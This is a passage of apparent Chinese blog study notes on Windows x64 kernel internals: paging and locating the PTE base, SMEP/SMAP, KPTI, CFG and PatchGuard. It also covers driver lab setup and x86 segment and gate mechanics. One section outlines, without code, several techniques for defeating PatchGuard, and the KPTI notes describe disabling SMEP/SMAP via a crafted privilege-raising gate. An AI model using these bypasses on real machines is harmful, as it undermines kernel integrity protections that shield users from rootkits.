前瞻</h2><p><strong>描述</strong>：</p><ul><li><p>在64位下，有两种<code>CPU</code>模式，一种是<code>IA-32e</code>模式，是<code>IA-32</code>模式的扩展，另一个是<code>Legacy</code>模式。<code>IA-32e</code>模式是指内核64位，用户64或32位均可，它强制平坦段，不支持任务切换；而<code>Legacy</code>模式指内核32位，用户32位支持非平坦段、任务切换、虚拟8086、实模式等。</p></li><li><p>在<code>IA-32e</code>模式下，代码段和数据段仍使用64位描述符，强制平坦(<code>FS</code>，<code>GS</code>除外)；<code>TSS</code>段描述符扩展到<code>128</code>位，<code>TSS</code>段不用来任务切换，主要保存一堆<code>rsp</code>备用指针；中断门描述符扩展到<code>128</code>位</p></li><li><p><strong>IA-32e</strong>是IA-32模式的扩展，它是一种状态，其内核为64位，用户可以是32位，也可以是64位</p></li><li><p>当在64位CPU中安装32位操作系统时，内核和用户都是32位的，这种状态叫做<strong>Legacy模式</strong></p></li></ul><p><strong>IA-32e模式的几个特性</strong>：</p><ul><li>强制平坦段：段基址不可随意设置，即不再兼容16位模式了。</li><li>不支持任务切换：取消了TSS任务切换</li><li>取消了虚拟8086模式和实模式切换</li></ul><h2 id="模式检测"><a class="markdownIt-Anchor" href="#模式检测"></a> 模式检测</h2><p><strong>描述</strong>：</p><ul><li>如果IA32_EFER MSR(下标为0xC0000080)寄存器的值第八位为1，说明当前系统处于IA-32e模式。</li></ul><h2 id="强制平坦段"><a class="markdownIt-Anchor" href="#强制平坦段"></a> 强制平坦段</h2><p><strong>描述</strong>：</p><ul><li><p>在x64模式下，段描述符已经不再描述段的基址和界限(除了FS和GS)，因此把这种机制叫做强制平坦段。</p></li><li><p>对于x64模式的gdt表来说，段描述符比x86系统少了很多，这是因为x64将侧重点放在了页保护而不是段保护。</p></li></ul><h2 id="任务切换"><a class="markdownIt-Anchor" href="#任务切换"></a> 任务切换</h2><p><strong>描述</strong>：</p><ul><li><p>在IA-32e模式下，TSS段描述符扩展到128位，用于满足寻址要求(普通段寄存器不再需要基址和界限)</p></li><li><p>TSS段描述符不用来进行任务切换，而是主要保存一堆RSP的备用指针(当3环和0环发生任务切换时)</p></li></ul><h2 id="中断门描述符"><a class="markdownIt-Anchor" href="#中断门描述符"></a> 中断门描述符</h2><p><strong>描述</strong>：</p><ul><li>在x64模式中，中断门描述符也拓展到了128位，这样才能满足寻址要求</li></ul><h2 id="fs-gs"><a class="markdownIt-Anchor" href="#fs-gs"></a> FS / GS</h2><p><strong>描述</strong>：</p><ul><li><p>在x64系统中，当处于0环时，FS不再指向KPCR，而是由GS指向KPCR，在3环时GS指向TEB</p></li><li><p>并且x64不再支持调用门、陷阱门、任务门，一律只支持中断门。</p></li><li><p>为什么要这么做呢？</p><ul><li>因为如果通过其他门进去后再去关中断，那么执行关中断的指令时，如果产生了外部中断，由于此时FS寄存器和GS寄存器还没被正确设置，因此可能会产生错误，而调用中断门时，系统会自动将EFLAGS中的IF位清零，即关闭外部中断。</li></ul></li><li><p>既然x64已经将段寄存器强制平坦了，FS和GS的基址该去哪里找呢？</p><ul><li>三个MSR寄存器。</li><li><code>IA32_FS_BASE</code>(下标0xC0000100)</li><li><code>IA32_GS_BASE</code>(下标0xC0000101)</li><li><code>IA32_KERNEL_GS_BASE</code>(下标0xC0000102)</li></ul></li></ul><h3 id="模式切换"><a class="markdownIt-Anchor" href="#模式切换"></a> 模式切换</h3><p><strong>中断</strong>：</p><ul><li>只使用一张IDT表，内核可以根据栈上的CS判断先前模式。</li></ul><p><strong>系统调用</strong>：</p><ul><li>只使用一张SSDT表</li><li>64位程序通过<code>syscall</code>进入内核</li><li>32位程序在<code>ring3转入x64模式</code>再进入内核</li></ul><h1 id="smep-smap"><a class="markdownIt-Anchor" href="#smep-smap"></a> SMEP &amp; SMAP</h1><ul><li><p><strong>SMEP</strong>：位于Cr4的第20位，作用是让处于内核权限的CPU无法执行用户代码</p></li><li><p><strong>SMAP</strong>：位于Cr4的第21位，作用是让处于内核权限的CPU无法读写用户代码</p><ul><li>STAC指令相当于Set AC，用于设置AC标志位，能暂时解除系统的一些保护，包括SMAP保护</li></ul></li><li><p>注意：</p><ul><li>即使解除这两个保护，也只能访问一部分0环内存，因为还存在内核页表隔离机制</li></ul></li></ul><h1 id="分页"><a class="markdownIt-Anchor" href="#分页"></a> 分页</h1><h2 id="9-9-9-9-12分页"><a class="markdownIt-Anchor" href="#9-9-9-9-12分页"></a> 9-9-9-9-12分页</h2><p><strong>描述</strong>：</p><ul><li><p>随着计算机技术的发展，64位系统逐渐占据主流地位，那么也就表示CPU的最大寻址范围为64位。但实际上，CPU只使用了其中的<strong>48位</strong>用于寻址，并使用<strong>9-9-9-9-12分页模式</strong>。即便如此，在未来较长一段时间里，48位寻址范围也足够大部分人的日常使用了</p></li><li><p>9-9-9-9-12分页表示物理地址拥有四级页表，在Intel开发手册中，将这四级页表分别称为<code>PML4E、PDPTE、PDE、PTE</code>，但微软的命名方式略有不同，将这四级页表分别称为 <code>PXE、PPE、PDE、PTE</code>，WinDbg中也是如此</p></li><li><p>对于地址 <code>21BABF52910</code>而言，先按照9-9-9-9-12分级，之后按照每一页占8个字节在<code>Cr3</code>的基础上寻找，这里最后3个字节的数据为物理页的属性，搜索的时候也是需要置零再进行相加搜索</p></li></ul><h2 id="页表基址"><a class="markdownIt-Anchor" href="#页表基址"></a> 页表基址</h2><h3 id="前瞻-2"><a class="markdownIt-Anchor" href="#前瞻-2"></a> 前瞻</h3><ul><li>操作系统会将当前进程的物理页映射在某个线性地址中，以供程序读取自己的页表内容</li><li>在x86系统中，页表基址是固定的，位于<code>0xC0000000</code>，将这个线性地址进行解析，访问其物理页的内容，会发现从这个地址开始，里面保存的数据为当前程序的所有物理页地址</li><li>而在x64系统中，页表基址不再是固定的值，而是每次系统启动后随机生成的</li><li>可以在WinDbg中查看0地址对应的线性地址来确定当前的页表基址，这里可以看到 <code>PXE、PPE、PDE、PTE</code> 的页表基址(只有后48位才是有效地址)<ul><li>其中，每个物理页占8个字节，例如，第一个物理页地址位于线性地址0xFFFF800000000000，第二个物理页地址位于线性地址0xFFFF800000000008，每个物理页中包含1024个字节的数据</li></ul></li></ul><h3 id="定位基址"><a class="markdownIt-Anchor" href="#定位基址"></a> 定位基址</h3><ul><li>关于定位随机化页表基址，这里包含两种方法[<a href="https://bbs.kanxue.com/thread-254276.htm">原创]逆向TesSafe.sys有感：鹅厂是如何定位随机化的PTE_BASE-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></li><li>同时周壑老师的定位方法就是首先在WinDbg中定位内核模块的地址，然后在内核模块中搜索与当前<code>页表基址</code>相同的值出现的位置，接着，在IDA中定位到数据所在的位置，可以看到是某行代码引用了这个值的硬编码，在WinDbg中查看这段代码，能够识别到<code>CcUnpinFileDataEx</code>函数(<strong>这个函数不重要，只要是引用了页表基址的api都可以利用</strong>)<ul><li>那么，由于系统每次启动时基址是不固定的，因此这些值也不可能是固定的硬编码，肯定是有“人”对这些值进行了修改，在需要使用时，可以通过固定的偏移量提取硬编码，从而得到页表基址，但要注意不同版本的内核文件的偏移量可能是不同的</li><li>这里的本质就是通过NT模块+固定偏移来进行定位</li></ul></li></ul><h3 id="线性地址定位"><a class="markdownIt-Anchor" href="#线性地址定位"></a> 线性地址定位</h3><h4 id="pde-to-pxe首地址定位"><a class="markdownIt-Anchor" href="#pde-to-pxe首地址定位"></a> PDE to PXE首地址定位</h4><p>​这里知道了页表基址(线性地址，也是存储着PTI的表的地址)，由此可以知道 <code>PDE PPE PXE</code> 的基址(例如存储着PDT的表的地址)</p><ul><li><p><strong>执行 PTE 所在物理页面的 PTE 是 PDE</strong>：这里的意思就是页表基址也是被一个PDT所指向的，所以可以根据页表地址来逆推出其他的基址。</p></li><li><p><strong>通俗解释</strong>：<strong>页表基址本身也是一个线性地址</strong>，也需要有人来管理，因此将页表基址本身当做一个线性地址，向右移动12位能够得到PDE基址对应的PTI，再乘以8(每个物理页地址占8个字节)就能够得到PDE基址在页表基址中的偏移量，然后将这个偏移量再加上页表基址就能得到PDE基址所在的线性地址。同理，也能够通过PDE基址得到PPE基址和PXE基址的线性地址</p></li><li><p><strong>计算公式</strong>：</p><ul><li><p><code>PDE_BASE</code> = ((addr &amp; 0xffffffffffff) &gt;&gt; 12) &lt;&lt; 3 + PTE_BASE----<code>addr = PTE_BASE</code></p></li><li><p><code>PPE_BASE</code> = ((addr &amp; 0xffffffffffff) &gt;&gt; 12) &lt;&lt; 3 + PTE_BASE----<code>addr = PDE_BASE</code></p></li><li><p><code>PXE_BASE</code> = ((addr &amp; 0xffffffffffff) &gt;&gt; 12) &lt;&lt; 3 + PTE_BASE----<code>addr = PPE_BASE</code></p></li></ul></li></ul><h4 id="物理地址定位"><a class="markdownIt-Anchor" href="#物理地址定位"></a> 物理地址定位</h4><p>​这里知道了 <code>PXE、PPE、PDE、PTE</code> 的基址，来定位当前地址所在的 <code>PXE、PPE、PDE、PTE</code> 地址</p><ul><li><p><strong>计算公式</strong>：</p><ul><li><p>PTE = PTE_BASE + ((Linear address &amp; 0xffffffffffff) &gt;&gt; 12) &lt;&lt; 3</p></li><li><p>PDE = PDE_BASE + ((Linear address &amp; 0xffffffffffff) &gt;&gt; 12) &lt;&lt; 3</p></li><li><p>PPE = PPE_BASE + ((Linear address &amp; 0xffffffffffff) &gt;&gt; 30) &lt;&lt; 3</p></li><li><p>PXE = PXE_BASE + ((Linear address &amp; 0xffffffffffff) &gt;&gt; 39) &lt;&lt; 3</p></li></ul></li></ul><h2 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h2><h1 id="kpti"><a class="markdownIt-Anchor" href="#kpti"></a> KPTI</h1><ul><li><strong>KPTI</strong>(Kernel page-table isolation)，即<strong>内核页表隔离机制</strong>。</li><li>通过在windbg中构造提权中断门以及关闭Cr4.SMEP/Cr4.SMAP，可以实现Supervisor执行用户层代码和访问数据，也可以映射内核KVASCODE段的数据(UserMode.Cr3/KernelMode.Cr3均有映射)</li><li>但是由于内核页表隔离机制的存在，内核的.text段并没有映射给UserMode.Cr3，而只映射给了KernelMode.Cr3</li><li>通过构造中断门进入自定义的中断服务例程时，其Cr3为UserMode.Cr3，而非KernelMode.Cr3。而通过Kernel.Cr3对页表映射解析时发现PXE.XD=1，即对KernelMode而言，该页面禁止执行(除非Cr4.SMEP=0&amp;&amp;XD=0)。Supervisor执行User物理页时需要满足Cr4.SMEP=0&amp;&amp;XD=0</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310051624205.png" alt="image-20231005162409174" /></p><blockquote><p>注意：这里可能因为Windows的版本问题，导致Cr3在用户态和内核态读取的数值一样(新版的Windows可能不开KPTI保护)</p><p>参考：</p><p><a href="https://blog.csdn.net/weixin_43890959/article/details/125477733">x64(win10) KPTI 内核页表隔离机制</a></p><p><a href="https://lzyddf.blog.csdn.net/article/details/123228503?spm=1001.2014.3001.5502">Windows x64内核学习笔记(五)—— KPTI(未完待续)</a></p></blockquote><h1 id="lfencecfg"><a class="markdownIt-Anchor" href="#lfencecfg"></a> LFENCE&amp;CFG</h1><h2 id="lfence"><a class="markdownIt-Anchor" href="#lfence"></a> LFENCE</h2><p><strong>描述</strong>：</p><ul><li>在内核文件中，能够经常看到在某行jcc指令的下方存在一条lfence指令，它的功能是禁止CPU对后面的指令预测执行。虽然禁止预测执行产生了性能上的部分损耗，但是提高了系统整体的安全性</li></ul><h2 id="cfg"><a class="markdownIt-Anchor" href="#cfg"></a> CFG</h2><p><strong>描述</strong>：</p><ul><li><strong>控制流防护</strong>(Control Flow Guard，CFG)是微软在Windows10和Windows8.1Update3中默认启用的一种安全防护机制，它主要是用于在发生间接跳转时，检查目标地址的合法性。</li></ul><h3 id="_guard_dispatch_icall"><a class="markdownIt-Anchor" href="#_guard_dispatch_icall"></a> _guard_dispatch_icall</h3><p><strong>描述</strong>：</p><ul><li><p>_guard_dispatch_icall是<strong>CFG机制的派遣函数</strong></p></li><li><p>在内核中，许多函数都需要进行间接调用，出于安全性考虑，避免目标地址被控制，因此不会直接CALL目标地址，而是先通过_guard_dispatch_icall检查地址合法性，并由其进行调用，如果地址合法，它的作用相当于「CALL RAX」</p></li></ul><h1 id="patch-guard"><a class="markdownIt-Anchor" href="#patch-guard"></a> Patch Guard</h1><h2 id="patch-guard-2"><a class="markdownIt-Anchor" href="#patch-guard-2"></a> Patch Guard</h2><p><strong>描述</strong>：</p><ul><li>Patch Guard(简称PG)是Windows x64系统中用于<strong>保护内核代码完整性和安全性的保护机制</strong>，能够防止任何不受信任的代码或驱动程序修改内核代码，从而防止系统破坏和恶意软件的传播。Patch Guard在系统启动时进行验证，并在系统运行过程中定期执行检查以确保内核代码的完整性。如果发现任何不正确的修改，Patch Guard会使系统蓝屏并重启系统以确保安全性，蓝屏代码为0x109。</li></ul><p><strong>原理</strong>：</p><ul><li>读取内核中的数据，并与系统初始化时的值进行比较。</li></ul><h2 id="context结构体"><a class="markdownIt-Anchor" href="#context结构体"></a> Context结构体</h2><p><strong>描述</strong>：</p><ul><li>PG(内核补丁保护Patch Guard))检测<strong>通常</strong>基于 context 结构体。context 结构体是一个内存数据结构，包含了系统内核的重要信息，包括内核代码的状态、配置和数据。Patch Guard 使用这个 context 结构体来验证内核代码的完整性。在系统启动时，PG 会创建并存储 context 结构体，并在系统运行过程中定期检查这个结构体是否被修改。如果发现任何不正确的修改，Patch Guard 将会重启系统以确保安全性。</li></ul><h3 id="context基本规则"><a class="markdownIt-Anchor" href="#context基本规则"></a> Context基本规则</h3><p>(注意：随着微软更新，以下规则在不同版本的系统中不一定通用)：</p><ol><li>context大部分时间处于加密状态</li><li>context的数据源来自系统初始化时的最初数据</li><li>context的地址作为系统线程，随着DPC等调度被传递</li><li>context的执行周期约为2min，但是每次检测的目标区块是随机的</li><li>context采用接力的方式调度，具体流程包括自解密、检测逻辑、复制自身到新的context、加密新的context、销毁旧的context</li><li>context检测逻辑的调用源有随机性，在PG初始化时决定</li></ol><h3 id="context内容"><a class="markdownIt-Anchor" href="#context内容"></a> Context内容</h3><ol><li>一小段自解密代码</li><li>要用到的系统api指针</li><li>重要的api代码的copy</li><li>INITKDBG节的copy</li><li>要检测的目标地址、大小、checksum、构成的结构体数组</li><li>…</li></ol><h3 id="context结构体包含信息"><a class="markdownIt-Anchor" href="#context结构体包含信息"></a> Context结构体包含信息</h3><ul><li>内核代码的版本信息：用于验证系统内核代码是否是最新版本，以确保安全性</li><li>内核代码的配置信息：用于验证系统内核代码的配置是否正确，以确保系统可以正常运行</li><li>内核代码的数据信息：包括系统内核代码中使用的全局变量、缓存、内存页面等，用于验证内核代码的数据完整性</li><li>内核代码的状态信息：包括系统内核代码的执行状态、挂起的线程和中断处理程序等，用于验证内核代码的状态完整性</li></ul><h3 id="context结构体包含代码"><a class="markdownIt-Anchor" href="#context结构体包含代码"></a> context结构体包含代码：</h3><ul><li>初始化代码：在系统启动时，初始化代码将创建并存储 context 结构体</li><li>检查代码：定期检查代码将检查 context 结构体是否被修改，以确保内核代码的完整性</li><li>重启代码：如果发现任何不正确的修改，重启代码将重启系统以确保安全性</li><li>恢复代码：如果重启系统，恢复代码将恢复系统的正常运行</li></ul><p>​Context 结构体在<strong>大部分时间处于加密状态</strong>，这个过程是通过使用内核级的加密技术实现的，主要使用密钥来对 context 结构体进行加密，并在解密时使用同一密钥。这样，即使恶意代码试图访问或修改 context 结构体，其内容仍然是加密的，因此不可读取。内核级的加密技术在内核空间中实现，因此它需要特殊的权限才能访问。这样，可以保护 - context 结构体不被恶意代码访问</p><h2 id="攻击手法"><a class="markdownIt-Anchor" href="#攻击手法"></a> 攻击手法</h2><ul><li><p><strong>静态补丁</strong>：如直接将函数入口patch为ret，这种方法是最稳定的，唯一的缺点就是要重启才能生效。</p></li><li><p><strong>VT实现读/执行分离</strong>：这种方法是通过禁止执行关键的代码段来避免检测。这种方法可以通过使用虚拟化技术来实现，但不是所有系统都支持。</p></li><li><p><strong>定位所有的context调用源，针对性patch</strong>：这种方法是通过修改代码的特定部分来避免检测。这种方法需要对系统的代码有较深的了解，否则可能导致严重的后果。</p></li><li><p><strong>基于加密算法分析，攻击context的内容</strong>：这种方法是通过对context内容进行解密，并修改检测代码来避免检测。此方法需要深入了解加密算法和检测代码，并可能需要使用特殊工具。</p><ul><li><p>搜索内存，粗筛context</p></li><li><p>基于加密算法特性，定位context</p></li><li><p>解密context，patch检测逻辑，加密写回context</p></li></ul></li><li><p><strong>设置context页面不可执行，接管页面异常处理</strong>：这种方法是通过禁止对context页面的访问来避免检测。此方法需要在页面异常处理过程中进行操作，以防止检测逻辑的执行。</p><ul><li>搜索内存，粗筛context</li><li>hook patch fault，接管执行保护异常</li><li>在异常处理中定位context，阻止检测逻辑</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>OS相关</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Win内核实验配置</title>
    <link href="/posts/618af193.html"/>
    <url>/posts/618af193.html</url>
    
    <content type="html"><![CDATA[<h1 id="win10虚拟机配置"><a class="markdownIt-Anchor" href="#win10虚拟机配置"></a> Win10虚拟机配置</h1><h2 id="设置只有管理员账户"><a class="markdownIt-Anchor" href="#设置只有管理员账户"></a> 设置只有管理员账户</h2><p><a href="https://zhuanlan.zhihu.com/p/558548390">Windows启用Administrator账户并删除其它用户 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/a18059272055/article/details/118602560">Windows10启用Administrator并设置任意密码（包括空密码）</a></p><h1 id="驱动环境配置"><a class="markdownIt-Anchor" href="#驱动环境配置"></a> 驱动环境配置</h1><ul><li>主要在于使用vs2019，SDK与WDK的对应关系。建议完全按照第一个视频的配置，可以参考第二个视频来进行检验<ul><li><a href="https://www.bilibili.com/video/BV1md4y1w7h3/?spm_id_from=333.337.search-card.all.click&amp;vd_source=17ac9da9453dbd6d64b9616668574c5f">【内核基础篇】Windows驱动开发环境搭建 2022年最新 超详细哦~_哔哩哔哩_bilibili</a></li><li><a href="https://www.bilibili.com/video/BV1Uw41127Vd/?spm_id_from=333.788&amp;vd_source=17ac9da9453dbd6d64b9616668574c5f">驱动环境搭建</a></li></ul></li></ul><h2 id="vs驱动配置问题汇总"><a class="markdownIt-Anchor" href="#vs驱动配置问题汇总"></a> VS驱动配置问题汇总</h2><ol><li><p><code>LNK129:&quot;&quot;/NXCOMPAT:NO&quot;与&quot;/DRIVER&quot; </code>规范不兼容；链接时不使用 <code>&quot;/NXCOMPAT:NO&quot;</code></p><ul><li>项目→属性→链接器→高级→数据执行保护(DEP)→<strong>是</strong></li></ul></li><li><p>c文件不可以使用 <code>extern “C”</code> 来引用汇编，只可以使用 <code>extern</code></p><ul><li><a href="https://www.cnblogs.com/mayingkun/p/3849042.html">vs2008+WDK7600驱动开发环境配置</a></li></ul></li></ol><h1 id="双机调试"><a class="markdownIt-Anchor" href="#双机调试"></a> 双机调试</h1><ul><li>这里分为winxp和win10操作系统<ul><li>winxp：<a href="https://www.cnblogs.com/wingsummer/p/15304804.html">双机调试winxp环境搭建</a></li><li>win10：<a href="https://www.bilibili.com/video/BV1Q84y1D7PW/?spm_id_from=333.788&amp;vd_source=17ac9da9453dbd6d64b9616668574c5f">双机调试win10环境搭建</a></li></ul></li></ul><h1 id="代码书写配置"><a class="markdownIt-Anchor" href="#代码书写配置"></a> 代码书写配置</h1><h2 id="跨平台运行"><a class="markdownIt-Anchor" href="#跨平台运行"></a> 跨平台运行</h2><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401272130141.png" alt="image-20240127213002094" /></p><p>这里的运行库一定要选多线程或是多线程调试，这是静态编译，不然环境问题会让你崩溃的</p><h2 id="64位混合编译"><a class="markdownIt-Anchor" href="#64位混合编译"></a> 64位混合编译</h2><ul><li>这里64位程序不支持内联汇编，所以需要设置vs进行混合编译</li></ul><p><a href="https://lzyddf.blog.csdn.net/article/details/123176096?spm=1001.2014.3001.5502">Win64 内核实验 SMEP&amp;SMAP</a></p>]]></content>
    
    
    <categories>
      
      <category>OS相关</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Win32_Kernel简述</title>
    <link href="/posts/705b8369.html"/>
    <url>/posts/705b8369.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>详细参考：</p><ul><li><a href="https://lzyddf.blog.csdn.net/?type=blog">Windows x32相关笔记</a></li><li><a href="https://www.cnblogs.com/wingsummer/p/15420700.html">羽夏看 Win 系统内核</a></li><li><a href="https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296">Windows 内核实验</a></li><li><a href="https://bbs.kanxue.com/homepage-867232.htm">Windows 内核学习笔记</a></li><li><a href="https://catecat.gitee.io/tags/WinXP%E5%86%85%E6%A0%B8/">WinXP内核</a></li></ul></blockquote><h1 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h1><h2 id="visual-studio"><a class="markdownIt-Anchor" href="#visual-studio"></a> visual studio</h2><ul><li>针对主机的 <code>visual studio 2022</code>, 虚拟机中的 <code>VC6</code> 大部分适合</li><li>使用主机的调试的时候记得选择 <code>release</code>, 同时关闭 <code>ASLR</code> ，防止地址随机化</li></ul><table><thead><tr><th>任务</th><th>快捷键</th></tr></thead><tbody><tr><td>开始调试</td><td>F5</td></tr><tr><td>停止编译</td><td>Ctrl + F5</td></tr><tr><td>设定断点</td><td>F9</td></tr><tr><td>逐过程调试(可以跳过函数)</td><td>F10</td></tr><tr><td>逐语句调试</td><td>F11</td></tr><tr><td>跳到光标处</td><td>Ctrl + F10</td></tr><tr><td>跳出本循环</td><td>Shift + F11</td></tr><tr><td>生成项目</td><td>Ctrl + B</td></tr><tr><td>注释</td><td>Ctrl + /</td></tr></tbody></table><h2 id="windbg"><a class="markdownIt-Anchor" href="#windbg"></a> Windbg</h2><h3 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h3><table><thead><tr><th>任务</th><th style="text-align:left">快捷键</th></tr></thead><tbody><tr><td>停止长调用</td><td style="text-align:left">Ctrl + Pause / Ctrl + 虚拟键盘(ctrl + win + o)中的ScrLK</td></tr><tr><td>查看寄存器</td><td style="text-align:left">r eax/gdtr    r–将通用的一些寄存器显示出来</td></tr><tr><td>查看内存</td><td style="text-align:left">dq/dd/dw/db [地址:b1b3ddb0] 如果是物理地址的话，就是 !dd [地址]</td></tr><tr><td>查看反编译</td><td style="text-align:left">u–将某一地址之后的内容反编译显示</td></tr><tr><td>修改内存数据</td><td style="text-align:left">eq ……(与上面同)</td></tr><tr><td>单步执行</td><td style="text-align:left">t–step into    p–step over</td></tr><tr><td>继续执行</td><td style="text-align:left">g</td></tr><tr><td>某一地址下断点</td><td style="text-align:left">bp 0040103d</td></tr><tr><td>断点操作</td><td style="text-align:left">bl–列出断点   bc ID–清除断点，这个ID首先需要bl查看</td></tr><tr><td>进程信息</td><td style="text-align:left">!process 0 0 显示进程列表</td></tr></tbody></table><h3 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h3><ul><li>windbg中可能会有残留数据存在，所以在使用时注意之前的残留，例如<code>!process 0 0</code>会有之气那的进程残存。这里其 <code>HandleCount</code> 为0则代表无效</li></ul><h1 id="保护模式"><a class="markdownIt-Anchor" href="#保护模式"></a> 保护模式</h1><h2 id="关于段"><a class="markdownIt-Anchor" href="#关于段"></a> 关于段</h2><h3 id="段寄存器"><a class="markdownIt-Anchor" href="#段寄存器"></a> 段寄存器</h3><ul><li>96位，<strong>ES、CS、SS、DS、FS、GS、LDTR、TR</strong></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023819.png" alt="image-20230912195711665" /></p><h3 id="段选择子"><a class="markdownIt-Anchor" href="#段选择子"></a> 段选择子</h3><ul><li>16位</li><li>Index：处理器将索引值乘以8在加上GDT或者LDT的基地址，就是要加载的段描述符。</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023767.png" alt="image-20230912195749416" /></p><h3 id="gdt"><a class="markdownIt-Anchor" href="#gdt"></a> GDT</h3><h4 id="相关知识点"><a class="markdownIt-Anchor" href="#相关知识点"></a> 相关知识点</h4><ul><li><p><code>GDT</code>为全局描述符表, 段描述符的大小为64位, <code>GDTR</code> 为存储其位置的寄存器(48位)</p></li><li><p>段选择子16位，段寄存器96位</p></li><li><p>段寄存器</p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023827.png" alt="image-20230918091401476" /></p><ul><li>段描述符</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023843.png" alt="image-20230912180656323" /></p><ul><li>区分：<ul><li>红色–<code>base</code></li><li>绿色–<code>seagment limit</code></li><li>蓝色–<code>Type</code><ul><li>S=1时，第4位为1为代码段，反之为数据段</li><li>C=1时，代表一致代码段，反之为非一致代码段</li></ul></li><li>黑色9–<code>P DPL S</code><ul><li>P=1描述符有效</li><li>S=1为代码段或者数据段</li></ul></li><li>黑色c–<code>G D/B 0 AVL</code></li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023814.png" alt="image-20230912181129051" /></p><ul><li>参考：<a href="https://www.cnblogs.com/wingsummer/p/15312627.html">段描述符与段选择子</a></li></ul><h4 id="相关指令"><a class="markdownIt-Anchor" href="#相关指令"></a> 相关指令</h4><ul><li><code>r gdtr </code>指令表示读取GDT表的地址</li><li><code>r gdtl</code> 指令表示读取GDT的大小</li><li><code>dp gtdr l40</code> 指令查看gdt表中大小为40个int(32位)的空间</li></ul><h3 id="代码段之间跳转"><a class="markdownIt-Anchor" href="#代码段之间跳转"></a> 代码段之间跳转</h3><ul><li><p>段间跳转，有2种情况，即要跳转的段是一致代码段还是非一致代码段，<strong>它们不同做的权限检查就不同</strong>。同时修改<code>CS</code>与<code>EIP</code>的指令如下：<code>JMP FAR</code>/<code>CALL FAR</code>/<code>RETF</code>/<code>INT</code>/<code>IRETED</code></p></li><li><p>段间跳转只使用 <code>JMP FAR</code>, 即长跳转</p></li><li><p>跳转规则：</p><ul><li>对于一致代码段，也称为共享段：<ul><li>特权级高的程序不允许访问特权级低的数据：核心态不允许访问用户态的数据</li><li>特权级低的程序可以访问到特权级高的数据，但特权级不会改变：用户态还是用户态</li><li>要求：<code>CPL</code>&gt;=<code>DPL</code></li></ul></li><li>对于非一致代码段：<ul><li>只允许同级访问</li><li>绝对禁止不同级别的访问：核心态不是用户态，用户态也不是核心态</li><li>要求：<code>CPL</code>==<code>DPL</code>且<code>RPL</code>&lt;=<code>DPL</code></li></ul></li></ul></li><li><p>跳转步骤：</p><ol><li>段选择子拆分–记住最后3位为<code>TI RPL</code>, 所以每次选择需要<code>i * 0x8</code></li><li>查表得到段描述符</li><li>权限检查–<code>CPL DPL RPL</code></li><li>加载段描述符–加载到 <code>CS</code> 段寄存器(96位)中</li><li>代码执行–<code>CPU</code>将<code>CS.Base + Offset</code>的值写入<code>EIP</code>然后跳转到将要执行的<code>CS:EIP</code>处的代码，段间跳转结束</li></ol></li><li><p>在跳转过程中, <code>CPL</code>不会发生改变，提权只能通过调用门</p></li></ul><h2 id="关于门"><a class="markdownIt-Anchor" href="#关于门"></a> 关于门</h2><h3 id="idt"><a class="markdownIt-Anchor" href="#idt"></a> IDT</h3><h4 id="相关知识点-2"><a class="markdownIt-Anchor" href="#相关知识点-2"></a> 相关知识点</h4><ul><li><code>IDT</code>为中断描述符表, <code>IDTR</code> 为存储其位置的寄存器，与<code>GDT</code>类似</li><li><code>IDT表</code>包含3种门描述符：任务门描述符、中断门描述符、陷阱门描述符</li></ul><h4 id="相关指令-2"><a class="markdownIt-Anchor" href="#相关指令-2"></a> 相关指令</h4><ul><li><code>r gdtr </code>指令表示读取GDT表的地址</li><li><code>r gdtl</code> 指令表示读取GDT的大小</li><li><code>dp gtdr l40</code> 指令查看gdt表中大小为40个int(32位)的空间</li></ul><h3 id="调用门"><a class="markdownIt-Anchor" href="#调用门"></a> 调用门</h3><ul><li>存储在GDT表中</li><li>长调用:<strong>CALL CS:EIP</strong>, 其中 <code>EIP</code> 废弃，<code>CS</code>为指向<code>调用门</code>的段选择子<ul><li>长调用不提权, 调用者CS入栈(相较于短调用所增加的)</li><li>长调用提权， 调用者SS, 调用者ESP, 调用者CS入栈</li></ul></li><li>指令格式：<code>CALL CS:EIP (EIP是废弃的)</code></li><li>执行流程：<ul><li>根据<code>CS</code>的值查<code>GDT表</code>，找到对应的段描述符且该描述符是一个调用门</li><li>在调用门描述符中存储另一个代码段的段选择子，将其加载到<code>CS</code>中(这里CS就发生了变化)</li><li>选择子指向的段的<code>Base</code>(Srgment Selector指向的代码段的base) + <code>偏移地址</code>(Offset in Segment)就是真正要执行的地址<ul><li>这里注意 <code>Segment Selector</code> 的值，当这里指向 <code>00cf9b00 0000ffff</code>(在它为0008,这里为代码段描述符，与下方的调用门格式不同) 时会显示报错，而指向 <code>00cf9a00 0000ffff</code>(存放在自己定义的地址) 则可以正常访问内核的内存</li><li>这里找出了问题所在，<code>0008</code> 位置的访问一直出现问题，把这个位置的数据放在别的地方就可以正常运行，由此里的访问需要重新指定位置(可能是我电脑的原因，maybe)</li></ul></li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310032023810.png" alt="image-20230912200012728" /></p><ul><li><code>CS</code> 的值可以根据地址直接得出</li></ul><h3 id="中断门"><a class="markdownIt-Anchor" href="#中断门"></a> 中断门</h3><ul><li><p>指令格式：<code>INT N 